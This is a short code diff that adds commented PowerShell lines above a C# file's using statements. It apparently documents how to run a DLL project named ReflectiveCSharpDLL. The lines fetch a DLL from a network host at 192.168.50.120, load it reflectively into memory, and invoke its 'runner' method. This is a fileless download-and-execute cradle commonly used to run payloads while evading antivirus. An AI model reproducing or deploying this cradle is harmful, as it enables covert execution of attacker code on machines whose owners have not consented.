@@ -1,3 +1,9 @@
+// $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.50.120/ReflectiveCSharpDLL.dll')
+// $assem = [System.Reflection.Assembly]::Load($data)
+// $class = $assem.GetType("ReflectiveCSharpDLL.Class1")
+// $method = $class.GetMethod("runner")
+// $method.Invoke(0, $null)
+
 using System;
 using System.Collections.Generic;
 using System.Linq;
